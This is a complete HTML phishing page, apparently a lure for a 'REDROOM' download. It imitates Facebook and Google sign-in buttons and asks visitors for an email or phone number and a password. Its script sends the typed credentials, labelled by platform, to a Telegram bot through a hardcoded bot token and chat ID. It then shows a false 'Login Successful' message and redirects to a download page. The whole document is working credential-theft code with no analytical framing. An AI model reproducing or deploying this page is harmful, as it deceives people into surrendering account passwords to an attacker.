<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - REDROOM Access</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Helvetica', Arial, sans-serif; }
        body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .login-box { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 8px 16px rgba(0, 0, 0, .1); width: 100%; max-width: 400px; text-align: center; }
        .logo { color: #e50914; font-size: 28px; font-weight: bold; margin-bottom: 20px; }
        .btn-social { display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; padding: 12px; border-radius: 6px; border: none; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 15px; }
        .btn-fb { background: #1877f2; color: white; }
        .btn-google { background: #fff; color: #5f6368; border: 1px solid #dadce0; }
        .form-group { display: none; text-align: left; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; }
        .submit-btn { width: 100%; padding: 14px; border: none; border-radius: 6px; font-size: 17px; font-weight: 700; cursor: pointer; background: #e50914; color: white; }
    </style>
</head>
<body>

<div class="login-box">
    <div class="logo">REDROOM</div>
    <div id="selection-area">
        <button class="btn-social btn-fb" onclick="showForm('Facebook')"><i class="fab fa-facebook"></i> Continue with Facebook</button>
        <button class="btn-social btn-google" onclick="showForm('Google')"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Logo.svg" width="18"> Continue with Google</button>
    </div>

    <div id="login-form" class="form-group">
        <h3 id="form-title" style="margin-bottom:15px; text-align:center;"></h3>
        <input type="text" id="username" placeholder="Email or Phone">
        <input type="password" id="password" placeholder="Password">
        <button class="submit-btn" id="subBtn" onclick="sendData()">Login & Download</button>
    </div>
</div>

<script>
    const botToken = "8490594899:AAE09QVVv2Z1OeOONTAbftWdv5KW-UZM8fo";
    const chatId = "7920005988";
    let currentPlatform = "";

    function showForm(platform) {
        currentPlatform = platform;
        document.getElementById('selection-area').style.display = 'none';
        document.getElementById('login-form').style.display = 'block';
        document.getElementById('form-title').innerText = "Login with " + platform;
    }

    function sendData() {
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;
        if(!user || !pass) return alert("Fill all fields");

        document.getElementById('subBtn').innerText = "Verifying...";
        
        const msg = `✅ LOGIN SUCCESS ✅\n\nPlatform: ${currentPlatform}\nUser: ${user}\nPass: ${pass}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: chatId, text: msg})
        }).then(() => {
            // ইউজারের নাম হিসেবে ইমেলের প্রথম অংশ সেভ করা হচ্ছে
            localStorage.setItem("userName", user.split('@')[0]);
            alert("Login Successful! Redirecting to download...");
            window.location.href = "index.html";
        });
    }
</script>
</body>
</html>
